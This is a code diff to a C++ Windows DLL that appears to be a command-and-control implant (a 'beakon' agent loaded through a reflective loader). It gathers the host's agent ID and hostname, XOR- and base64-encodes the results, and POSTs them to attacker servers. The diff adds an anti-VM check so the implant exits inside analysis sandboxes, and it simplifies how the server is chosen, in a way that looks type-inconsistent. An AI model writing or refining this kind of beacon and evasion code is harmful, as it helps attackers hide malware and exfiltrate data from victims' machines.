@@ -13,6 +13,8 @@
 #include <random>
 #include <ctime>
 
+extern "C" bool is_virtual_machine();
+
 std::string beakon(const std::string& data_res) {
     std::string agent_id = generate_agent_id();
     std::string hostname = get_hostname();
@@ -29,17 +31,18 @@ std::string beakon(const std::string& data_res) {
     std::string result_json = ss.str();
     std::string encoded = xor_data(result_json, XOR_KEY);
     std::string b64_encoded = base64_encode(encoded);
-    constexpr int VOLCHOCK_SERVERS_COUNT = sizeof(VOLCHOCK_SERVERS) / sizeof(VOLCHOCK_SERVERS[0]);
-    std::mt19937 rng((unsigned int)std::time(nullptr));
-    std::uniform_int_distribution<int> distrib(0, VOLCHOCK_SERVERS_COUNT - 1);
-    int random_index = distrib(rng);
-    std::string res = http_post(VOLCHOCK_SERVERS[random_index], VOLCHOCK_PORT, RESULTS_PATH, USER_AGENT, HEADER, b64_encoded);
+    
+    // Simple fix - use VOLCHOCK_SERVERS directly
+    std::string res = http_post(VOLCHOCK_SERVERS, VOLCHOCK_PORT, RESULTS_PATH, USER_AGENT, HEADER, b64_encoded);
     return res;
 }
 
 
 extern "C" __declspec(dllexport) void agent_run() {
-    //MessageBoxA(0, "START AGENT !", "ReflectiveLoader", 0);
+    if (is_virtual_machine()) {
+        return;
+    }
+
     std::setvbuf(stdout, NULL, _IONBF, 0);
     std::string register_call = beakon("");
     std::string result;
